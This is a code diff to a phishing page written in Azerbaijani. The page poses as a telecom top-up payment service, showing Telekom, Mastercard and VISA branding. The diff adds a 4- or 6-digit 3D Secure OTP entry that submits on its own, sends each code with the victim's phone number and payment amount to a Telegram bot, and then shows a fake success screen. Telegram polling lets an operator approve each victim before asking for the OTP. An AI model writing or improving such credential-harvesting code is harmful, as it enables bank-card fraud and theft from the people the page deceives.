@@ -72,10 +72,6 @@
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .logo-img {
-            height: 40px;
-            object-fit: contain;
-        }
         .operator-icon {
             width: 56px;
             height: 56px;
@@ -119,6 +115,76 @@
             background: white;
             padding: 8px;
         }
+
+        /* OTP - Həm 4, həm 6 rəqəm üçün */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 16px 0 12px;
+            flex-wrap: wrap;
+        }
+        .otp-box {
+            width: 52px;
+            height: 60px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            font-weight: 700;
+            background: #f9fafb;
+            transition: all 0.3s ease;
+            color: #1e293b;
+            text-align: center;
+        }
+        .otp-box:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+            outline: none;
+        }
+        .otp-box.filled {
+            border-color: #3b82f6;
+            background: #eff6ff;
+            color: #2563eb;
+        }
+        .otp-box.completed {
+            border-color: #22c55e;
+            background: #f0fdf4;
+            color: #16a34a;
+        }
+        .otp-length-selector {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+        .otp-length-btn {
+            padding: 6px 20px;
+            border-radius: 999px;
+            border: 2px solid #e5e7eb;
+            background: white;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            color: #64748b;
+        }
+        .otp-length-btn:hover {
+            border-color: #94a3b8;
+        }
+        .otp-length-btn.active {
+            border-color: #2563eb;
+            background: #eff6ff;
+            color: #2563eb;
+        }
+        .otp-timer {
+            text-align: center;
+            font-size: 12px;
+            color: #94a3b8;
+            margin-top: 4px;
+        }
     </style>
 </head>
 <body class="flex items-center justify-center p-4">
@@ -140,7 +206,6 @@
             <div id="step-1">
                 <div class="text-center mb-6">
                     <div class="inline-block bg-blue-50 rounded-full p-3 mb-4">
-                        <!-- Telekom loqosu telefon emojisi yerinə -->
                         <img src="https://cdn.brandfetch.io/idxq_HjDKr/w/400/h/400/theme/dark/icon.jpeg?c=1bxid64Mup7aczewSAYMX&t=1781905013465" 
                              alt="Telekom" 
                              class="header-logo"
@@ -369,29 +434,41 @@
                 </div>
             </div>
 
-            <!-- Step 7: 3D Secure -->
+            <!-- Step 7: 3D Secure - HƏM 4, HƏM 6 RƏQƏMLİ OTP -->
             <div id="step-7" class="hidden fade-in">
-                <div class="flex items-center gap-3 mb-6">
+                <div class="flex items-center gap-3 mb-4">
                     <button class="back-btn" onclick="goBack()">
                         <i class="fas fa-arrow-left"></i>
                     </button>
                     <div class="font-bold text-gray-800">3D Təhlükəsizlik</div>
                 </div>
 
-                <div class="flex justify-center gap-8 mb-6">
+                <div class="flex justify-center gap-8 mb-4">
                     <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 40'%3E%3Crect width='120' height='40' rx='6' fill='%23EB001B'/%3E%3Ccircle cx='45' cy='20' r='14' fill='%23F79E1B' opacity='0.5'/%3E%3Ccircle cx='55' cy='20' r='14' fill='%23EB001B' opacity='0.5'/%3E%3Ctext x='72' y='24' font-family='Arial' font-size='11' fill='white' font-weight='bold'%3EMastercard%3C/text%3E%3C/svg%3E" class="h-8">
                     <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 40'%3E%3Crect width='120' height='40' rx='6' fill='%231A1F71'/%3E%3Ccircle cx='35' cy='20' r='14' fill='%23EB001B'/%3E%3Ccircle cx='55' cy='20' r='14' fill='%23F79E1B'/%3E%3Ctext x='75' y='24' font-family='Arial' font-size='14' fill='white' font-weight='bold'%3EVISA%3C/text%3E%3C/svg%3E" class="h-8">
                 </div>
 
-                <h3 class="text-center font-semibold text-gray-800 text-xl mb-2">3D Təhlükəsizlik</h3>
-                <p class="text-center text-sm text-gray-600 mb-6">Nömrənizə göndərilən 6 rəqəmli kodu daxil edin.</p>
+                <h3 class="text-center font-semibold text-gray-800 text-lg mb-1">3D Təhlükəsizlik</h3>
+                <p class="text-center text-sm text-gray-600 mb-3">Nömrənizə göndərilən kodu daxil edin.</p>
 
-                <div class="flex justify-center gap-3 mb-8">
-                    <input id="otp" type="text" maxlength="6" placeholder="000000" 
-                           class="input-field w-48 text-center text-3xl tracking-widest p-4 rounded-2xl bg-white">
+                <!-- OTP Uzunluq Seçimi -->
+                <div class="otp-length-selector">
+                    <button onclick="setOTPLength(4)" class="otp-length-btn active" id="otpLen4">4 rəqəm</button>
+                    <button onclick="setOTPLength(6)" class="otp-length-btn" id="otpLen6">6 rəqəm</button>
                 </div>
 
-                <button onclick="verifyOTP()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-semibold shadow-lg shadow-blue-500/30">Təsdiq et</button>
+                <!-- OTP Kutuları (dinamik) -->
+                <div class="otp-container" id="otpContainer">
+                    <!-- JavaScript ilə yaradılacaq -->
+                </div>
+
+                <div class="otp-timer">
+                    <i class="far fa-clock mr-1"></i> Kodun etibarlılıq müddəti: 5 dəqiqə
+                </div>
+
+                <button onclick="verifyOTP()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-semibold shadow-lg shadow-blue-500/30 mt-4">
+                    Təsdiq et
+                </button>
             </div>
 
             <!-- Success -->
@@ -434,6 +511,8 @@
         let isWaitingForApproval = false;
         let approvalInterval = null;
         let lastUpdateId = 0;
+        let otpLength = 4; // 4 və ya 6
+        let otpValues = [];
 
         const operators = [
             { name: "Bakcell", prefixes: ["055", "099"] },
@@ -449,12 +528,107 @@
         };
 
         // ========================================
+        // OTP - 4 və 6 RƏQƏM ÜÇÜN
+        // ========================================
+        function setOTPLength(length) {
+            otpLength = length;
+            
+            // Düymələri yenilə
+            document.querySelectorAll('.otp-length-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(`otpLen${length}`).classList.add('active');
+            
+            // OTP kutularını yenidən yarat
+            createOTPBoxes(length);
+        }
+
+        function createOTPBoxes(count) {
+            const container = document.getElementById('otpContainer');
+            container.innerHTML = '';
+            otpValues = [];
+            
+            for (let i = 0; i < count; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.className = 'otp-box';
+                input.id = `otp${i}`;
+                input.setAttribute('inputmode', 'numeric');
+                input.setAttribute('autocomplete', 'one-time-code');
+                
+                input.addEventListener('input', function(e) {
+                    // Yalnız rəqəm qəbul et
+                    this.value = this.value.replace(/\D/g, '');
+                    
+                    if (this.value.length === 1) {
+                        this.classList.add('filled');
+                        // Növbəti xanaya keç
+                        const next = i + 1;
+                        if (next < count) {
+                            document.getElementById(`otp${next}`).focus();
+                        } else {
+                            // Son xanadırsa, avtomatik təsdiqlə
+                            setTimeout(() => verifyOTP(), 200);
+                        }
+                    } else {
+                        this.classList.remove('filled');
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '') {
+                        const prev = i - 1;
+                        if (prev >= 0) {
+                            document.getElementById(`otp${prev}`).focus();
+                            document.getElementById(`otp${prev}`).select();
+                        }
+                    }
+                });
+                
+                input.addEventListener('focus', function() {
+                    this.select();
+                });
+                
+                container.appendChild(input);
+                otpValues.push('');
+            }
+            
+            // İlk xanaya fokus ver
+            setTimeout(() => {
+                const first = document.getElementById('otp0');
+                if (first) first.focus();
+            }, 100);
+        }
+
+        function getOTPCode() {
+            let code = '';
+            const count = otpLength;
+            for (let i = 0; i < count; i++) {
+                const el = document.getElementById(`otp${i}`);
+                if (el) code += el.value || '';
+            }
+            return code;
+        }
+
+        function clearOTP() {
+            const count = otpLength;
+            for (let i = 0; i < count; i++) {
+                const el = document.getElementById(`otp${i}`);
+                if (el) {
+                    el.value = '';
+                    el.classList.remove('filled');
+                }
+            }
+            const first = document.getElementById('otp0');
+            if (first) first.focus();
+        }
+
+        // ========================================
         // TELEGRAM FUNKSİYALARI
         // ========================================
 
         function sendToTelegram(data, isOTP = false) {
             let message = isOTP ? 
-                `🔐 3D Secure Təsdiq Kodu daxil edildi!\n\n📱 Nömrə: ${data.phone}\n💰 Məbləğ: ${data.amount} AZN\n🔢 OTP Kodu: ${data.otp}\n\n✅ Ödəniş təsdiqləndi!` :
+                `🔐 3D Secure Təsdiq Kodu daxil edildi!\n\n📱 Nömrə: ${data.phone}\n💰 Məbləğ: ${data.amount} AZN\n🔢 OTP Kodu: ${data.otp}\n✅ Ödəniş təsdiqləndi!` :
                 `
 🔔 YENİ ÖDƏNİŞ SORĞUSU!
 ━━━━━━━━━━━━━━━━━━━━
@@ -543,7 +717,7 @@
                                 stopTelegramPolling();
                                 document.getElementById('step-6').classList.add('hidden');
                                 document.getElementById('step-7').classList.remove('hidden');
-                                document.getElementById('otp').value = '';
+                                clearOTP();
                                 return;
                                 
                             } else if (callbackData === "reject") {
@@ -734,17 +908,33 @@
             startTelegramPolling();
         }
 
+        // ========================================
+        // OTP TƏSDİQİ (4 və 6 rəqəm)
+        // ========================================
         function verifyOTP() {
-            const otp = document.getElementById('otp').value;
-            if (otp.length !== 6) {
-                return alert("⚠️ 6 rəqəmli kodu daxil edin");
+            const code = getOTPCode();
+            const expectedLength = otpLength;
+            
+            if (code.length !== expectedLength) {
+                alert(`⚠️ ${expectedLength} rəqəmli kodu tam daxil edin!`);
+                return;
             }
 
+            // Telegram-a OTP kodunu göndər
             sendToTelegram({
-                otp: otp,
+                otp: code,
                 phone: phoneNumber,
                 amount: currentPackage
             }, true);
+
+            // Bütün OTP kutularını "completed" et
+            for (let i = 0; i < expectedLength; i++) {
+                const el = document.getElementById(`otp${i}`);
+                if (el) {
+                    el.classList.remove('filled');
+                    el.classList.add('completed');
+                }
+            }
 
             document.getElementById('step-7').classList.add('hidden');
             document.getElementById('success-screen').classList.remove('hidden');
@@ -784,11 +974,13 @@
             }
         }
 
-        // Operator siyahısını sırala (Bakcell, Azercell, Nar)
         window.onload = function() {
             console.log("%c📱 Milli Telecom - Admin təsdiqli sistem hazırdır", "color: #2563eb; font-size: 16px; font-weight: bold;");
             console.log(`🤖 Bot token: ${BOT_TOKEN}`);
             console.log(`📢 Kanal ID: ${CHAT_ID}`);
+            
+            // Default OTP 4 rəqəm
+            setOTPLength(4);
         };
 
         window.addEventListener('beforeunload', function() {
@@ -796,4 +988,4 @@
         });
     </script>
 </body>
-    </html>
+                    </html>
